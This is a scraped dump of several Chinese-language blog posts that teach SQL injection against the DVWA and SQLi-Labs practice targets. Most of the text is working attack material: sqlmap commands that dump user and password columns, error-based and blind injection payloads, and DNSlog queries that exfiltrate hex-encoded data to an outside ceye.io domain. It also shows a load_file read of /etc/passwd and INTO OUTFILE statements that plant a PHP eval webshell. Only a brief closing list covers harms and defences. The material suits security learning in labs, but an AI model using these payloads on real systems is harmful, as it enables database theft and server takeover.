+<h1 id="获取users表下的列"><a href="#获取users表下的列" class="headerlink" title="获取users表下的列"></a>获取users表下的列</h1><p>   –column 列<br>   -T 表<br>    <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa -T users --column</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/8.jpg"></p>
+<h1 id="获取user，password信息并dump下来"><a href="#获取user，password信息并dump下来" class="headerlink" title="获取user，password信息并dump下来"></a>获取user，password信息并dump下来</h1><p>   –dump dump数据<br>   -C 列<br>   <code>sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  --cookie=&quot;security=low;PHPSESSID=eob9vqhplaaquph45pceeqju34&quot; -D dvwa -T users -C password,user --dump</code><br>   <img src="/2020/08/21/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5DVWA/9.jpg"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://kvmtnk.top/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wyattt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wyattt's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">HTTP Header注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-20 16:04:09 / 修改时间：17:29:05" itemprop="dateCreated datePublished" datetime="2020-08-20T16:04:09+08:00">2020-08-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="HTTP头介绍"><a href="#HTTP头介绍" class="headerlink" title="HTTP头介绍"></a>HTTP头介绍</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/52xuege/p/9271315.html">https://www.cnblogs.com/52xuege/p/9271315.html</a></p>
+<p>#可以被注入的头参数</p>
+<ol>
+<li>cookie</li>
+<li>Rerferer</li>
+<li>User-Agent</li>
+<li>X-Forwarded-For</li>
+<li>Client-IP</li>
+<li>HOST</li>
+</ol>
+<h1 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h1><h2 id="以SQLi-Labs靶场-Less-18关为例"><a href="#以SQLi-Labs靶场-Less-18关为例" class="headerlink" title="以SQLi Labs靶场 Less-18关为例"></a>以SQLi Labs靶场 Less-18关为例</h2><p>  <img src="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/1.jpg"><br>  用burpsuit抓包并发送给Repeater<br>  在User-Agent处输入个单引号’进行测试<br>  <img src="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/2.jpg"></p>
+<p>  <img src="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/3.jpg"><br>  出现了报错，可能存在注入</p>
+<p>  继续输入<code>&#39;and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code>报错注入语句<br>  <img src="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/4.jpg"><br>  我们得到了用户权限信息</p>
+<p>  输入 <code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code><br>  <img src="/2020/08/20/HTTP-Header%E6%B3%A8%E5%85%A5/5.jpg"><br>  我们得到了版本信息</p>
+<h1 id="Referer-注入"><a href="#Referer-注入" class="headerlink" title="Referer 注入"></a>Referer 注入</h1><p>   步骤同上</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://kvmtnk.top/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wyattt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wyattt's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">DNSlog注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-20 15:23:52 / 修改时间：15:32:43" itemprop="dateCreated datePublished" datetime="2020-08-20T15:23:52+08:00">2020-08-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/1.png"><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/2.png"></p>
+<h1 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>条件：<br>支持load_file()函数  高版本默认不支持</p>
+<p>开启allow_url_fopen  默认开启</p>
+<p>核心语句：<code>select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.idnlnl.ceye.io\\abv&#39;));</code></p>
+<p><code>select load_file(concat(&#39;\\\\&#39;,(select 1111),&#39;.idnlnl.ceye.io\\abv&#39;));</code><br>该语句将值1111和域名idnlnl.ceye.io拼接了起来，发起了dns查询<br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/3.png"><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/4.png"></p>
+<p>concat()函数：</p>
+<p>concat(str1,str2,…)</p>
+<p><strong>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</strong><br>mysql&gt; select concat(‘11’,’22’,’33’);</p>
+<p>+————————+| concat(‘11’,’22’,’33’) |</p>
+<p>+————————+</p>
+<p>| 112233 |</p>
+<p>+————————+</p>
+<p>1 row in set (0.00 sec)</p>
+<p>为什么加上hex：</p>
+<p>为了避免查询结果有：-/字符，这些字符不能出现在域名里面，只能是数字或者字母</p>
+<h3 id="DVWA实战"><a href="#DVWA实战" class="headerlink" title="DVWA实战"></a>DVWA实战</h3><p>1’ and if((select load_file(concat(‘\\‘,hex((select schema_name from information_schema.schemata limit 0,1)),’.idnlnl.ceye.io\abv’))),2,0) And ‘1’=’1<br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/5.png"><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/6.png"><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/7.png"></p>
+<p><code>1&#39; and if((select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.idnlnl.ceye.io\\abv&#39;))),1,0) And &#39;1&#39;=&#39;1</code><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/8.png"></p>
+<h3 id="为什么是"><a href="#为什么是" class="headerlink" title="为什么是\\"></a>为什么是\\</h3><p>实际是\</p>
+<p>因为转译的问题</p>
+<p>\<a target="_blank" rel="noopener" href="http://root.idnlnl.ceye.io/">root.idnlnl.ceye.io</a>\abv</p>
+<p>去做一个请求<br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/9.png"><br><img src="/2020/08/20/DNSlog%E6%B3%A8%E5%85%A5/10.png"></p>
+<h2 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h2><p>主要作用在微软上的映射网络驱动器，最多应用于局域网中访问服务器或者打印机</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://kvmtnk.top/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wyattt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wyattt's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/" class="post-title-link" itemprop="url">MySQL注入之权限处理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-20 15:00:18 / 修改时间：15:18:43" itemprop="dateCreated datePublished" datetime="2020-08-20T15:00:18+08:00">2020-08-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="目标：写入webshell"><a href="#目标：写入webshell" class="headerlink" title="目标：写入webshell"></a>目标：写入webshell</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol>
+<li>mysql用户权限为root，或者有读写的权限账号</li>
+<li>知道网站绝对路径，（phpinfo，404，报错，爆破）可得到</li>
+<li>gpc是否开启，开启则单引号被转义，语句不能正常执行</li>
+<li>在mysql的配置文件 my.ini 中，secure_file_priv=”c:/wamp64/tmp” 被注释 或者 `secure_file_priv 配置的位置是web目录或者为空。</li>
+</ol>
+<p><img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/1.png"><br>  可以读写<br>  查询secure_file_priv状态<br>  <img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/2.png"></p>
+<p>  <img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/3.png"></p>
+<h1 id="MYSQL读文件"><a href="#MYSQL读文件" class="headerlink" title="MYSQL读文件"></a>MYSQL读文件</h1><p>  mysql读文件用load_file()函数</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">select load_file(0x2F6574632F706173737764);</span><br></pre></td></tr></table></figure>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>  INTO OUTFILE函数写文件会在每一行结束添加换行符</p>
+<p>  INTO DUMPFILE函数写文件会得到原生内容，这种方式对于二进制是最好的选择</p>
+<ul>
+<li><p>select ‘<?php @eval($_POST[pass])?>‘ into outfile ‘/var/www/html/muma.php’ ;</p>
+</li>
+<li><p>select ‘<?php @eval($_POST[pass])?>‘ into DUMPFILE ‘/var/www/html/muma.php’ ;</p>
+</li>
+<li><p>select * from tdb_goods where goods_id=1 into outfile “/var/www/html/muma.php”<br>LINES STARTING BY ‘<?php @eval($_POST[pass])?>‘<br>LINES STARTING BY ‘写入的内容’<br>设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。<br>LINES TERMINATED BY ‘写入的内容’<br>设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是”\n”。<br><img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/4.png"></p>
+<h2 id="报错注入得到版本信息"><a href="#报错注入得到版本信息" class="headerlink" title="报错注入得到版本信息"></a>报错注入得到版本信息</h2><p><code>1&#39; and(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) And &#39;%&#39;=&#39;</code><br><img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/5.png"></p>
+<p>写入文件<br><code>1&#39; into outfile &#39;D:\\phpStudy\\WWW\\DVWA\\muma.php&#39;  LINES STARTING BY  &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;#</code></p>
+<p>lines starting by 可以理解为以每行开始的位置添加xx内容</p>
+<p>muma.php写入成功，利用工具中国菜刀或中国蚁剑连接webshell<br><img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/6.png"><br><img src="/2020/08/20/MySQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/7.png"></p>
+<h2 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h2></li>
+</ul>
+<ul>
+<li>@是一个变量</li>
+<li>eval()函数是执行PHP代码的一个函数</li>
+<li>$_POST[‘pass’];是可以进行一个提交POST参数的操作</li>
+<li>pass=phpinfo();</li>
+<li>pass=echo “hacker by 111”;</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://kvmtnk.top/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wyattt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wyattt's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">MySQL注入攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-19 16:47:03" itemprop="dateCreated datePublished" datetime="2020-08-19T16:47:03+08:00">2020-08-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-21 11:46:20" itemprop="dateModified" datetime="2020-08-21T11:46:20+08:00">2020-08-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="什么是注入攻击"><a href="#什么是注入攻击" class="headerlink" title="什么是注入攻击"></a>什么是注入攻击</h1><p>  服务器在接受客户端的查询参数后，未对查询参数进行严格过滤，导致恶意用户可以在查询参数中插入恶意sql语句来查询数据库敏感信息，最终导致数据库信息泄露。</p>
+<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><ol>
+<li>联合查询注入</li>
+<li>报错注入</li>
+<li>布尔型盲注</li>
+<li>延时盲注</li>
+</ol>
+<h1 id="判断是否存在注入漏洞"><a href="#判断是否存在注入漏洞" class="headerlink" title="判断是否存在注入漏洞"></a>判断是否存在注入漏洞</h1><p>以DVWA靶场为例<br>输入单引号’<br> <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/1.png"><br><img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/2.png"><br>出现报错，可能存在sql注入</p>
+<p>正常输入 1<br><img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/11.png"><br>SQL注入语句解析：<br><code>mysql&gt; select first_name,last_name from dvwa.users; </code><br><code>mysql&gt; select first_name,last_name from dvwa.users where user_id=&#39;1&#39;;</code><br>你输入1 相当于在最后的两个单引号中间插入一个1来执行mysql的查询语句</p>
+<p>输入1’and’1’=’1  (1’和前面的单引号’闭合,’1和后面的单引号’闭合了)<br><img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/3.png"><br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; and &#39;1&#39; =&#39;1&#39;</code></p>
+<p>继续输入1’and’1’=’2<br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; and &#39;1&#39; =&#39;2&#39;</code><br>  没有返回任何画面</p>
+<p>  判断可能为字符型注入</p>
+<h2 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h2><p>  输入1’ order by 1 #  (#号表示注释)<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/4.png"></p>
+<p>  继续输入1’ order by 1#和1’ order by 2#都显示</p>
+<p>  当输入1’ order by 3#时<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/5.png"></p>
+<p>  出现了报错，证明只有两个字段</p>
+<h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><h3 id="获取当前数据库和数据库用户名"><a href="#获取当前数据库和数据库用户名" class="headerlink" title="获取当前数据库和数据库用户名"></a>获取当前数据库和数据库用户名</h3><p>  <code>1&#39; union select database(),user() #</code><br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/6.png"><br>  显示得到当前的数据库名为dvwa,数据库用户名为root@localhost</p>
+<h3 id="获取数据库版本和操作系统版本"><a href="#获取数据库版本和操作系统版本" class="headerlink" title="获取数据库版本和操作系统版本"></a>获取数据库版本和操作系统版本</h3><p>  <code>1&#39; union select version(),@@version_compile_os#</code><br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/7.png"></p>
+<h2 id="为什么要获取数据"><a href="#为什么要获取数据" class="headerlink" title="为什么要获取数据"></a>为什么要获取数据</h2><p>  我们需要判断MySQL的版本。因为当MySQL的版本小于4.0时，是不支持union select联合查询的；<br>  当MySQL版本大于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表，<br>  表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
+<h2 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h2><p>  <code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39; #</code><br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/8.png"></p>
+<p>  在information_schema数据库库的表中查询有关dvwa数据库的表</p>
+<p>  这里获取到了有dvwa的数据库里有两张表guestbook和users</p>
+<p>  我们对users表进行查询获取表中的列名</p>
+<p>  <code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code></p>
+<p>  group_concat(column_name)函数可列举该字段的所有内容<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/9.png"></p>
+<h3 id="获取users表中的数据user，password字段信息"><a href="#获取users表中的数据user，password字段信息" class="headerlink" title="获取users表中的数据user，password字段信息"></a>获取users表中的数据user，password字段信息</h3><p>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/10.png"></p>
+<h1 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>  and if((length(database())&gt;5),sleep(5),0)</p>
+<p>构造逻辑语句，通过条件语句进行判断，为真时则延时执行，为假时立即执行</p>
+<h3 id="什么情况下使用延时盲注"><a href="#什么情况下使用延时盲注" class="headerlink" title="什么情况下使用延时盲注"></a>什么情况下使用延时盲注</h3><p>  当既不回显数据，也不回显错误信息时</p>
+<p>  联合查询，报错查询和布尔盲注在此时不起作用时</p>
+<p>  if函数</p>
+<p>  格式： if(condition,a,b)</p>
+<p>  含义：如果condition成立，则a，否则b</p>
+<p>  条件：mysql&gt;=5.0 使用sleep()进行查询<br>        mysql&lt;5.0 使用benchmark()进行查询</p>
+<h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>  输入1’ and sleep(5)#<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/12.png"><br>  耗时了5秒，证明存在注入</p>
+<h3 id="猜解数据库名长度"><a href="#猜解数据库名长度" class="headerlink" title="猜解数据库名长度"></a>猜解数据库名长度</h3><p>1’ and if(length(database())=4,sleep(5),1)#</p>
+<h3 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h3><p>1’ and if(ascii(substr(database(),1,1))=100,sleep(5),1)#</p>
+<p>出现延时</p>
+<p>以次猜解得到数据库名称为dvwa</p>
+<h3 id="猜解数据库中有几张表"><a href="#猜解数据库中有几张表" class="headerlink" title="猜解数据库中有几张表"></a>猜解数据库中有几张表</h3><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=’dvwa’)=2,sleep(5),1)#</p>
+<h3 id="猜解表名称的长度"><a href="#猜解表名称的长度" class="headerlink" title="猜解表名称的长度"></a>猜解表名称的长度</h3><p>1’ and if(length((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1))=9,sleep(5),1)# </p>
+<h3 id="猜解第二个表的长度"><a href="#猜解第二个表的长度" class="headerlink" title="猜解第二个表的长度"></a>猜解第二个表的长度</h3><p>1’ and if(length((select table_name from information_schema.tables where table_schema=’dvwa’ limit 1,1))=5,sleep(5),1)#  </p>
+<h3 id="猜解表的名称"><a href="#猜解表的名称" class="headerlink" title="猜解表的名称"></a>猜解表的名称</h3><p>猜解第一个表</p>
+<p>1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1,1))=103,sleep(5),1)#  </p>
+<p>猜解字段名</p>
+<p>猜解users表中有几个字段</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name=’users’)=8,sleep(5),1)#</p>
+<p>猜解字段名称同上</p>
+<h1 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h1><p>  原理：<br>  对数据库进行猜解，进行拼凑</p>
+<h2 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h2><p>  length() 返回字符串的长度，例如可以返回数据库名的长度</p>
+<p>  substr() 用来截取字符串</p>
+<p>  ascii() 返回字符的ascill码</p>
+<p>  sleep(n) 将程序挂在一段时间，n为n秒</p>
+<h2 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h2><h3 id="猜长度"><a href="#猜长度" class="headerlink" title="猜长度"></a>猜长度</h3><p>  输入 1’ and length(database())=1 #<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/13.png"></p>
+<p>  不存在</p>
+<p>  继续输入 1’ and length(database())=4 #<br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/14.png"><br>  存在</p>
+<h2 id="猜解数据库名字符串"><a href="#猜解数据库名字符串" class="headerlink" title="猜解数据库名字符串"></a>猜解数据库名字符串</h2><p>  二分法逐字猜解<br>  输入 <code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code><br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/15.png"><br>  显示存在，ascii码97代表a，说明数据库名第一个字符串是大于a</p>
+<p>  substr()函数</p>
+<p>  语法：</p>
+<p>  substr(string,start,length)</p>
+<p>  string代表字符串，start开始位置，长度如果没有，那就是默认</p>
+<p>  因为有26个英文字母，最后一个字母为z，ascii码为122,所以我们直接查询数据库最后一个字母，看是否存在</p>
+<p>  输入  <code>1&#39; and ascii(substr(database(),1,1))&lt;122 #</code><br>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/16.png"></p>
+<p>  存在</p>
+<p>  以下查询109，103存在</p>
+<p>  查询&lt;100</p>
+<p>  <img src="/2020/08/19/MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/17.png"></p>
+<p>  不存在</p>
+<p>  查询&gt;100<br>  也不存在<br>  证明数据库名第一个字符ascii码为100，也就是小写字母d</p>
+<p>  输入以上步骤直到得到完整的数据库名dvwa</p>
+<p>  格式：<code>1&#39; and ascii(substr(database(),n,1))&gt;100 #</code></p>
+<p>  n第几个字符</p>
+<h2 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h2><p>猜解表的数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.table where table_schema&#x3D;database())&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>  显示不存在</p>
+<pre><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2 #
+```显示存在
+
+证明dvwa库里有两张表
+
+## 猜解第一个表的长度
+
+`1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #`
+
+显示不存在
+
+。。。
+
+。。。
+
+`1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #`
+
+显示存在
+
+## 猜解第一个表的名字
+
+`1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;97 #`
+
+显示存在
+
+。。。
+
+。。。
+
+以次猜解
+
+重复操作得出表名为guestbook,users
+格式：`1&#39; and ascii(substr((select table_name from information_schema.tables where
+table_schema=database() limit 0,1),n,1))&gt;97 #`
+
+## 猜解表中的字段名
+
+猜解字段的数量
+
+`1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=1 #`
+
+显示不存在
+
+=8
+
+显示存在
+
+### 猜解第一个字段的长度
+
+`1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=1 # `
+
+显示不存在
+
+`1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=7 # `
+
+显示存在
+
+猜解第一个字段名
+
+`1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;97 #`
+
+显示存在
+
+。。。
+
+。。。
+## 猜解数据
+
+and ascii (substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #
+
+......
+
+### 暴力猜解
+
+`1&#39; and (select count(*) from users where user = &#39;admin&#39;) = 1#  `
+
+# SQL注入危害
+  1. 数据库信息泄露
+  2. 网站挂马：当拿到webshell时，将木马挂在服务器上攻击别人
+  3. 读取文件获取webshell
+
+  # 如何防范
+  1. 对特殊字符进行编码转换--比如开启gpc（默认开启）
+  2. 不要使用管理员权限的数据连接，最好为每个应用使用单独的数据连接
+  3. 尽量少给提示
+  4. 使用安全产品
+
+### 其他
+联合查询：合并多个相似的选择查询结果
+
